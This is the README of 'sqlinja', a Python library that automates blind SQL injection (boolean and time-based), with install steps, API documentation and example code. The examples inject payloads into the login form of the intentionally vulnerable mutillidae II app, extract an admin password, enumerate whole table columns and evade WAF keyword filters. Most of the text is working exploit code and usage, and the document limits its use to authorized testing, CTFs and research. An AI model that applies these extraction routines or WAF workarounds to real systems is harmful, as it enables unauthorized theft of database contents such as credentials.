# sqlinja
SqlInja is a Python library automating the exploitation of blind SQL injection,
time-based or boolean-based. You supply the injection point; it builds the
payloads, drives the search and reassembles the extracted values.

Extraction uses a [binary search](https://en.wikipedia.org/wiki/Binary_search_algorithm)
over the candidate characters, so a character costs about log2(n) requests
instead of n.

Dialects out of the box: `MySqlConfig`, `MsSqlConfig`, `SqliteConfig` -- each a
small `AbstractConfig` subclass built from SQL-fragment callables. See
[Extending the library](#extending-the-library) to bend one around a WAF or add
your own.

## Installation

Not published on PyPI. Install from source:

```bash
git clone https://github.com/CybCorv/sqlinja.git
cd sqlinja
pip install -e .
```

Requires Python 3.10+ (PEP 604 unions and `typing.Protocol` are used throughout).
The only runtime dependency of the library itself is the standard library; the
example scripts use `requests`.

## Quickstart

You write the oracle -- one function injecting a payload and reporting whether
the condition held. sqlinja handles everything above it:

```python
import string
import requests
from sqlinja import MySqlConfig, Mode, SqlInja

def exec_request(payload: str, sleep_duration: int) -> bool:
    """The oracle: True if the injected condition was true."""
    res = requests.post(
        "http://meta.local/mutillidae/index.php?page=login.php",
        data={'username': f"test' OR {payload} # ", 'password': "pass",
              'login-php-submit-button': "Login"},
        allow_redirects=False, timeout=10,
    )
    return res.status_code == 302

helper = SqlInja(MySqlConfig(), exec_request, mode=Mode.BOOLEAN)
if not helper.check("SELECT 1"):
    raise SystemExit("target is not vulnerable")

request = "SELECT password FROM accounts WHERE username = 'admin' LIMIT 0,1"
print("".join(helper.extract_until_end_char(request, string.ascii_letters + string.digits)))
```

Runnable versions of this, for both modes, are under
[`examples/`](examples/) (targeting the login of
[mutillidae II](https://github.com/webpwnized/mutillidae)).

## The oracle function

It must match `(payload: str, sleep_duration: int) -> bool` and holds all the
target-specific logic (encoding, CSRF token, method, ...). What it reads depends
on the mode:

- `Mode.BOOLEAN` -- any observable difference between a true and a false
  condition: status code, response length, a marker in the body.
  `sleep_duration` is unused.
- `Mode.TIME` -- whether the response took at least `sleep_duration` seconds,
  e.g. `res.elapsed.total_seconds() >= sleep_duration`. Set the HTTP timeout
  above `sleep_duration`, or it aborts the delay it is measuring.

In both modes, never return `False` on a transport failure (timeout, connection
reset): read as "condition false", it silently flips a bit of the extracted
value. Catch, log, retry -- or let it raise:

```python
def exec_request(payload: str, sleep_duration: int) -> bool:
    for attempt in range(3):
        try:
            res = requests.post(url, data=datas, timeout=sleep_duration + 10)
            return res.elapsed.total_seconds() >= sleep_duration
        except requests.exceptions.RequestException as exc:
            logger.warning("request failed (attempt %d/3): %s", attempt + 1, exc)
            if attempt == 2:
                raise
```

## Extraction

`mode` picks the blind strategy. `Mode.TIME` needs a config implementing
`as_time`: `MySqlConfig` and `MsSqlConfig` do, `SqliteConfig` does not (SQLite
has no `SLEEP`/`WAITFOR`).

`check()` confirms the injection point works before spending requests on it:

```python
helper = SqlInja(MySqlConfig(), exec_request, mode=Mode.TIME)
if not helper.check("SELECT 1"):
    raise SystemExit("target is not vulnerable")
```

### Coping with a noisy oracle

Every resolved character is confirmed against the target, so a character missing
from `candidates` is never silently rounded to the nearest one. Retrying tells
the two failure causes apart: network jitter makes a probe lie *at random*, so a
retry usually succeeds and only logs a warning; a character outside `candidates`
is denied *every time*, and raises `CandidateTooNarrow`.

```python
from sqlinja import CandidateTooNarrow

try:
    name = "".join(helper.extract_until_end_char(request, candidates))
except CandidateTooNarrow as exc:
    print(f"widen the candidate set: {exc}")
```

`confirm_char_max_retries` (default `2`) sets that budget -- raise it for a
noisier oracle. At `0` the two causes are indistinguishable, and the exception
says so rather than blaming the candidate set.

### Extract a scalar value

`extract_val()` binary-searches an integer result (e.g. a `COUNT(*)`) between
`min_value` and `max_value`, useful to size a loop before calling
`extract_column()`:

```python
nb_accounts = helper.extract_val("SELECT COUNT(*) FROM accounts", 0, 500)
print("accounts:", nb_accounts)
```

### Extract data from a cell

`candidates` narrows the binary search to plausible characters. A plain string
works, or a `set[int]`/`list[int]` of character codes to build the domain by
hand. Both extractors yield characters one at a time, so a slow extraction can
be printed as it comes in (see the [Quickstart](#quickstart)).

They differ only in how they detect the end of the value. `extract_until_end_char()`
stops on `end_char`, which is cheaper. `extract_by_length()` reads the length
first, then exactly that many characters -- one extra search, but no `end_char`
needed. Use it where `end_char` is unreliable (dialects where NULL and `''` are
the same value, e.g. Oracle) or is itself a plausible character of the value.

```python
result = helper.extract_by_length(request, candidates)
print("pass for 'admin' : ", "".join(result))
```

`max_length` (default `255`) guards both, differently: `extract_until_end_char()`
raises `RuntimeError` if it reads that many characters without meeting
`end_char`, while `extract_by_length()` uses it as the upper bound of the length
search, silently truncating past it. Raise it for long fields.

`start_with` resumes from what is already known, e.g. after an interrupted run:

```python
for char in helper.extract_until_end_char(request, candidates, start_with="adminp"):
    ...
```

### NULL cells

Both extractors above yield characters, so a NULL cell and an empty one are
indistinguishable -- no characters either way. `extract_cell()` costs one extra
request and returns `None` for NULL:

```python
value = helper.extract_cell(request, candidates)  # str, or None if NULL
```

`is_null()` exposes that test on its own, and `extract_column_rows()` yields `None` for each NULL row.

### Extract a whole column

`extract_column()` walks every row, one page at a time, through the config's
`limit()` fragment. `request_template` needs a single `{index}` placeholder. It
yields one generator per row:

```python
request_template = "SELECT username FROM accounts ORDER BY username {index}"
for row in helper.extract_column(request_template, candidates, start_index=0):
    print("".join(row))
```

It stops once `check()` fails on a row. Since a mis-scoped query can iterate far
more rows than intended, and each row costs many requests, `max_index` caps it
at `999` by default -- past that it warns and stops. Raise it if you expect more
rows, or size the loop with `extract_val()` and pass `-1` to lift the cap:

```python
nb_accounts = helper.extract_val("SELECT COUNT(*) FROM accounts", 0, 100_000)
for row in helper.extract_column(request_template, candidates, start_index=0, max_index=-1):
    print("".join(row))
```

`extract_column_rows()` takes the same arguments but yields each row joined as a
`str`, or `None` for a NULL cell -- the only way to spot NULL rows in a column.
It also passes each row as the next one's `start_with`, so a shared prefix
(sorted values) costs one probe per shared character:

```python
for row in helper.extract_column_rows(request_template, candidates, start_index=0):
    print("<NULL>" if row is None else row)
```

To resume an interrupted run, restart at the last completed row with
`start_index`, plus `start_with` if that row was cut mid-cell:

```python
partial_row = "adm"  # what was read of row 4 before the interruption
for row in helper.extract_column(request_template, candidates, start_index=4, start_with=partial_row):
    print("".join(row))
```

More examples under [`examples/`](examples/).

## Extending the library

### Working around a WAF, or adding a dialect

Each config field is one callable producing one SQL fragment, so a blacklisted
keyword is worked around by overriding that single field on an instance:

```python
config = MySqlConfig()
config.range_ = lambda v, mn, mx: f">={v + 1}"  # if BETWEEN is filtered
helper = SqlInja(config, exec_request)
```

For a new dialect, subclass `AbstractConfig` and fill the fragments --
[`sqliteConfig.py`](sqlinja/sqliteConfig.py) is 20 lines and the shortest to
copy. Three fields worth care:

- `code_or_end` coalesces a character read past the end of the string to
  `end_char`: `UNICODE('')` is NULL in T-SQL, `ORD('')` is 0 in MySQL.
- `has_result` tests that a row *exists*, NULL included. Testing the value
  (`(req) IS NOT NULL`) truncates a column at its first NULL cell.
- `as_time` stays `None` without a sleep primitive: `Mode.TIME` is then rejected
  at construction instead of hanging on a payload that does nothing.

### Replacing the search itself

The default search is a dichotomy over the sorted candidate codes. Its pieces
are exported so another probing strategy can replace it:

- `SearchStrategy` -- the `Protocol` to implement. `next_operator(config)`
  returns the fragment for the next probe; `narrow(result)` returns the resolved
  character code, or `None` to ask for another probe. `resolved_by_equality()`
  returning `True` lets `SqlInja` skip its confirmation probe.
- `CandidateSet` -- the sorted codes, plus `end_char`.
- `BinarySearch` -- the default dichotomy over them.
- `PrefixReplay` -- wraps a strategy to replay a known prefix character by
  character; this is what makes `start_with` cost one probe per known character.
- `SearchContext` -- state of one extraction (domain, prefix, cursor), returning
  a fresh strategy per character from `new_strategy()`.

```python
class FrequencyOrderedContext(SearchContext):
    def new_strategy(self) -> SearchStrategy:
        return MyStrategy(self.candidate_set)  # e.g. probe 'e' before 'z'
```

`SqlInja` instantiates `SearchContext` inside each extraction method, so there
is no constructor argument to pass yours in: subclass `SqlInja` and override the
method you need. These internals sit below the rest of the API and may move
between minor versions.

## Tests

The suite needs no target and no dependencies -- the tests that talk to a real
MySQL/MSSQL server skip themselves when the driver or the server is missing:

```bash
python -m unittest discover -s tests
```

To run those integration tests too, install their drivers with
`pip install -r requirements-dev.txt` and start a throwaway database: the
`docker run` command and the environment variables each one reads are in the
docstring of `tests/test_mysql_docker.py` and `tests/test_mssql_docker.py`.

## Contributing

Contributions are welcome! If you find a bug or have a feature request, please create an issue or submit a pull request.

## Legal disclaimer

This tool is intended for authorized security testing only: penetration testing
engagements you have written permission for, CTF competitions, and security
research on systems you own.

Using it against a target without the owner's explicit consent is illegal. It is
the end user's responsibility to obey all laws applicable to their location. The
developers assume no liability and are not responsible for any misuse of, or
damage caused by, this program.
